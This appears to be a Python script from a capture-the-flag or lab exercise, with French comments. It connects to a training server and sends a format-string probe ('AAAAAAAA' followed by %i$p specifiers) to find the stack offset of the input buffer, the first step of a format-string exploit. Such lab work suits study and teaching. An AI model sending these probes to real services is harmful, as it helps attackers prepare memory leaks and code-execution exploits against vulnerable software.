import sys, socket, time, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "xebec.cylabacademy.net", 28899
s = socket.create_connection((HOST, PORT), timeout=12)
s.settimeout(6)
time.sleep(0.6)
try:
    s.recv(4096)
except Exception:
    pass
payload = b"AAAAAAAA" + "".join(f".%{i}$p" for i in range(1, 80)).encode() + b"\n"
s.sendall(payload)
time.sleep(0.9)
out = b""
try:
    out = s.recv(65536)
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print(txt[:300])
print("...")
print(txt[-1200:])
# chercher 4141414141414141
for m in re.finditer(r"0x4141414141414141", txt):
    print("buffer trouve a l'offset char:", m.start())
# compter les positions
parts = re.split(r"\.", txt)
for i, p in enumerate(parts):
    if "4141414141414141" in p:
        print("position (index dans les .%i$p):", i)
s.close()
